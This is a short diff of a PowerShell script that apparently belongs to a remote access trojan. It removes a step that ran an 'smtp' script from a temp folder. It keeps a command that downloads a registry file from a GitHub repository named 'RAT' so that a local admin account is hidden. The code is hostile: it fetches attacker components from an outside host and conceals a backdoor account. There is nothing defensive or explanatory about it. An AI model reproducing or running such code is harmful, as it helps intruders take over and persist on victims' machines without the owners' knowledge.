@@ -36,13 +36,10 @@ $wd = random_text
 $path = "$env:temp/$wd"
 $initial_dir = Get-Location
 
-#smtp process
-
 
 mkdir $path
 cd $path
-mv $initial_dir/smtp.txt ./smtp.ps1
-./smtp.ps1
+
 # registry to hide local admin
 Invoke-WebRequest -Uri raw.githubusercontent.com/lukeeeeeee335/RAT/main/files/wrev.reg -OutFile "wrev.reg"
 
